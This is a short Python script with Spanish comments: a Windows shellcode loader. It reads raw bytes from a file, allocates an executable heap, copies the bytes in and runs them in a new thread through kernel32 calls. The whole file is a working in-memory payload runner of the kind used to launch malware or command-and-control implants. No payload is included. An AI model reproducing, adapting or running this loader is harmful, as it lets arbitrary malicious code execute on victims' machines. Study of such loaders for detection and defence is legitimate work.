import time
import ctypes
import ctypes.wintypes as wt
import os

kernel32 = ctypes.windll.kernel32

def load_shellcode_from_file(file_path):
    """Carga la shellcode desde un archivo binario"""
    try:
        if not os.path.exists(file_path):
            print(f"[!] Error: El archivo {file_path} no existe")
            return None
        
        with open(file_path, 'rb') as file:
            shellcode = file.read()
        
        if len(shellcode) == 0:
            print("[!] Error: El archivo está vacío")
            return None
            
        print(f"[*] Shellcode cargada desde: {file_path}")
        print(f"[*] Tamaño de la shellcode: {len(shellcode)} bytes")
        return shellcode
        
    except Exception as e:
        print(f"[!] Error al cargar el archivo: {e}")
        return None

def kernel32_function_definitions(sc):
    if sc is None or len(sc) == 0:
        print("[!] Error: No hay shellcode para ejecutar")
        return

    # HeapAlloc()
    HeapAlloc = ctypes.windll.kernel32.HeapAlloc
    HeapAlloc.argtypes = [wt.HANDLE, wt.DWORD, ctypes.c_size_t]
    HeapAlloc.restype = wt.LPVOID

    # HeapCreate()
    HeapCreate = ctypes.windll.kernel32.HeapCreate
    HeapCreate.argtypes = [wt.DWORD, ctypes.c_size_t, ctypes.c_size_t]
    HeapCreate.restype = wt.HANDLE

    # RtlMoveMemory()
    RtlMoveMemory = ctypes.windll.kernel32.RtlMoveMemory
    RtlMoveMemory.argtypes = [wt.LPVOID, wt.LPVOID, ctypes.c_size_t]
    RtlMoveMemory.restype = wt.LPVOID

    # CreateThread()
    CreateThread = ctypes.windll.kernel32.CreateThread
    CreateThread.argtypes = [
        wt.LPVOID, ctypes.c_size_t, wt.LPVOID, wt.LPVOID, wt.DWORD, wt.LPVOID
    ]
    CreateThread.restype = wt.HANDLE

    # WaitForSingleObject
    WaitForSingleObject = kernel32.WaitForSingleObject
    WaitForSingleObject.argtypes = [wt.HANDLE, wt.DWORD]
    WaitForSingleObject.restype = wt.DWORD

    heap = HeapCreate(0x00040000, len(sc), 0)
    if not heap:
        print("[!] Error: HeapCreate falló")
        return
        
    alloc = HeapAlloc(heap, 0x00000008, len(sc))
    if not alloc:
        print("[!] Error: HeapAlloc falló")
        return
        
    print('[*] HeapAlloc() Memory at: {:08X}'.format(alloc))
    
    RtlMoveMemory(alloc, sc, len(sc))
    print('[*] Shellcode copied into memory.')
    
    thread = CreateThread(0, 0, alloc, 0, 0, 0)
    if not thread:
        print("[!] Error: CreateThread falló")
        return
        
    print('[*] CreateThread() in same process.')
    WaitForSingleObject(thread, 0xFFFFFFFF)

def main():
    # Cambia esta ruta por la ubicación de tu archivo de shellcode
    shellcode_path = "C:/Tools/shellcode.bin"
    
    # Cargar shellcode desde archivo
    sc = load_shellcode_from_file(shellcode_path)
    
    if sc is not None:
        kernel32_function_definitions(sc)
    else:
        print("[!] No se pudo cargar la shellcode, terminando ejecución")

if __name__ == '__main__':
    main()
